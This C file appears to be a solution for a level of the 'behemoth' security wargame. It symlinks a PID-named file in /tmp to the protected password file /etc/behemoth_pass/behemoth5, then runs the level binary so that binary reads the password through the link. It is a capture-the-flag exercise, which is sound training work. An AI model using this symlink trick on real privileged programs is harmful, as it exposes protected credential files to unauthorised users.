#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>

int main()
{
    pid_t pid = getpid();
    printf("current pid is %d\n", pid);

    char command[20];
    sprintf(command, "touch /tmp/%d", pid);
    system(command);
    printf("created /tmp/%d\n", pid);

    char command_link[50];
    sprintf(command_link, "ln -sf /etc/behemoth_pass/behemoth5 /tmp/%d", pid);
    system(command_link);
    printf("linked /tmp/%d to /etc/behemoth_pass/behemoth5\n", pid);

    const char* filename = "/behemoth/behemoth4";
    execl(filename, filename ,NULL);

    return 0;
}

